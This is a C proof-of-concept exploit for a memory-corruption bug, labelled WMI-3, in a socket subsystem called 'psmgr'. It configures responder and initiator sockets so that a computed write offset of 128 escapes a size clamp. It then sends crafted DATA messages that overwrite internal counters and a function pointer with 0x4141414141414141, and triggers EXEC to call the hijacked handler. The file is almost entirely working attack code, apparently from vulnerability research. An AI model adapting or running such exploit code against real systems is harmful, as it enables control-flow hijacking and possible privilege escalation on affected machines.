/*
 * PoC for WMI-3: Attacker-Determined Content in an Authoritative Position
 * @ psmgr_process_data (psmgr_core.c:283)
 *
 * Uses MANAGED session (single socket, all params via LOCAL_CTX).
 * For WINDOW+LINEAR: out_offset = proc_param = 127.
 * After token is set (48 writes), write_limit = 144.
 * But out_offset(127) < 128, so write_limit clamped to 128.
 * copy_len = min(payload_len, 1) -> 1 byte at data[127].
 *
 * Actually using INITIATOR+RESPONDER with REFLECT+INTERLEAVE to get
 * out_offset=128, which bypasses the clamping and allows writing
 * to write_count/token/handler fields.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>

#define AF_PSMGR		46
#define SOCK_SEQPACKET		5
#define PSMGR_SOL		282

/* Socket options */
#define PSMGR_OPT_SET_ROLE	1
#define PSMGR_OPT_NEGO_1	2
#define PSMGR_OPT_NEGO_2	3
#define PSMGR_OPT_LOCAL_CTX	4
#define PSMGR_OPT_WINDOW	5
#define PSMGR_OPT_EXEC		6

/* Roles */
#define PSMGR_ROLE_MANAGED	0x01
#define PSMGR_ROLE_INITIATOR	0x02
#define PSMGR_ROLE_RESPONDER	0x03

/* Classes */
#define PSMGR_CLASS_EXTENDED	0x02

/* XFRM types */
#define PSMGR_XFRM_REFLECT	0x04

/* Modes */
#define PSMGR_MODE_INTERLEAVE	0x02

/* Message types */
#define PSMGR_MSG_DATA		0x05

#define PSMGR_BUF_DATA_SZ	128
#define PSMGR_BUF_WRITE_THRESH	48

struct sockaddr_psmgr {
	unsigned short	spsmgr_family;
	unsigned int	spsmgr_id;
};

struct psmgr_msghdr {
	unsigned char	msg_type;
	unsigned char	session_id_lo;
	unsigned short	payload_len;
	unsigned int	seq;
} __attribute__((packed));

static int do_send_data(int fd, unsigned int session_id, unsigned int seq,
			const void *payload, unsigned short payload_len)
{
	struct psmgr_msghdr hdr;
	struct iovec iov[2];
	struct msghdr msg;

	memset(&msg, 0, sizeof(msg));
	hdr.msg_type = PSMGR_MSG_DATA;
	hdr.session_id_lo = session_id & 0xFF;
	hdr.payload_len = payload_len;
	hdr.seq = seq;
	iov[0].iov_base = &hdr;
	iov[0].iov_len = sizeof(hdr);
	iov[1].iov_base = (void *)payload;
	iov[1].iov_len = payload_len;
	msg.msg_iov = iov;
	msg.msg_iovlen = 2;

	return sendmsg(fd, &msg, 0);
}

int main(void)
{
	int init_fd, resp_fd;
	unsigned int resp_id;
	unsigned char data_buf[32];
	struct sockaddr_psmgr addr;
	socklen_t addrlen;
	int ret;

	printf("[*] Creating RESPONDER socket...\n");
	resp_fd = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
	if (resp_fd < 0) {
		perror("socket(responder)");
		return 1;
	}

	printf("[*] Creating INITIATOR socket...\n");
	init_fd = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
	if (init_fd < 0) {
		perror("socket(initiator)");
		close(resp_fd);
		return 1;
	}

	/* RESPONDER: set role, nego2, bind */
	printf("[*] RESPONDER: set role...\n");
	ret = setsockopt(resp_fd, PSMGR_SOL, PSMGR_OPT_SET_ROLE,
			 &(unsigned char){PSMGR_ROLE_RESPONDER}, 1);
	if (ret < 0) { perror("resp set_role"); close(init_fd); close(resp_fd); return 1; }

	printf("[*] RESPONDER: NEGO_2 (INTERLEAVE, proc_param=127)...\n");
	{
		struct {
			unsigned short reserved2;
			unsigned char enc_mode;
			unsigned char reserved;
			unsigned int proc_param;
		} __attribute__((packed)) nego2 = {
			.reserved2 = 0,
			.enc_mode = PSMGR_MODE_INTERLEAVE,
			.reserved = 0,
			.proc_param = 127,
		};
		ret = setsockopt(resp_fd, PSMGR_SOL, PSMGR_OPT_NEGO_2, &nego2, sizeof(nego2));
		if (ret < 0) { perror("resp nego2"); close(init_fd); close(resp_fd); return 1; }
	}

	printf("[*] RESPONDER: bind...\n");
	memset(&addr, 0, sizeof(addr));
	addr.spsmgr_family = AF_PSMGR;
	addr.spsmgr_id = 0;
	if (bind(resp_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("bind"); close(init_fd); close(resp_fd); return 1;
	}

	addrlen = sizeof(addr);
	getsockname(resp_fd, (struct sockaddr*)&addr, &addrlen);
	resp_id = addr.spsmgr_id;
	printf("[*] RESPONDER session_id = %u\n", resp_id);

	/* INITIATOR: set role, nego1, connect */
	printf("[*] INITIATOR: set role...\n");
	ret = setsockopt(init_fd, PSMGR_SOL, PSMGR_OPT_SET_ROLE,
			 &(unsigned char){PSMGR_ROLE_INITIATOR}, 1);
	if (ret < 0) { perror("init set_role"); close(init_fd); close(resp_fd); return 1; }

	printf("[*] INITIATOR: NEGO_1 (REFLECT, EXTENDED)...\n");
	{
		struct {
			unsigned char enc_class;
			unsigned char xfrm_type;
			unsigned short reserved;
		} __attribute__((packed)) nego1 = {
			.enc_class = PSMGR_CLASS_EXTENDED,
			.xfrm_type = PSMGR_XFRM_REFLECT,
			.reserved = 0,
		};
		ret = setsockopt(init_fd, PSMGR_SOL, PSMGR_OPT_NEGO_1, &nego1, sizeof(nego1));
		if (ret < 0) { perror("init nego1"); close(init_fd); close(resp_fd); return 1; }
	}

	printf("[*] INITIATOR: connect to RESPONDER %u...\n", resp_id);
	memset(&addr, 0, sizeof(addr));
	addr.spsmgr_family = AF_PSMGR;
	addr.spsmgr_id = resp_id;
	if (connect(init_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("connect"); close(init_fd); close(resp_fd); return 1;
	}
	printf("[*] Connected! out_offset = (127^63)*2 = 128\n");

	/*
	 * Step 1: Send DATA to overwrite write_count (offset 128-131).
	 * With token==0: write_limit = 132, copy_len = min(4, 132-128) = 4
	 * Set write_count = 48 so token gets computed.
	 */
	printf("[*] DATA: overwrite write_count -> 48...\n");
	memset(data_buf, 0, 4);
	data_buf[0] = PSMGR_BUF_WRITE_THRESH;
	ret = do_send_data(init_fd, resp_id, 0, data_buf, 4);
	if (ret < 0) { perror("send_data1"); close(init_fd); close(resp_fd); return 1; }
	printf("[*] done (wrote write_count=%u)\n", PSMGR_BUF_WRITE_THRESH);

	/*
	 * Step 2: Send DATA to overwrite handler (offset 136-143).
	 * With token!=0: write_limit = 144, copy_len = min(16, 144-128) = 16
	 */
	printf("[*] DATA: overwrite handler...\n");
	memset(data_buf, 0, 16);
	memset(data_buf, 0xAA, 4);     /* write_count */
	data_buf[4] = 1;               /* token != 0 */
	memset(data_buf + 8, 0x41, 8); /* handler = 0x4141414141414141 */
	ret = do_send_data(init_fd, resp_id, 1, data_buf, 16);
	if (ret < 0) { perror("send_data2"); close(init_fd); close(resp_fd); return 1; }
	printf("[*] done (handler = 0x4141414141414141)\n");

	/*
	 * Step 3: Trigger exec - this calls the corrupted handler -> crash
	 */
	printf("[*] Triggering EXEC...\n");
	ret = setsockopt(init_fd, PSMGR_SOL, PSMGR_OPT_EXEC, NULL, 0);
	printf("[*] EXEC returned %d (%m)\n", ret);

	printf("[*] Done.\n");
	close(init_fd);
	close(resp_fd);
	return 0;
}
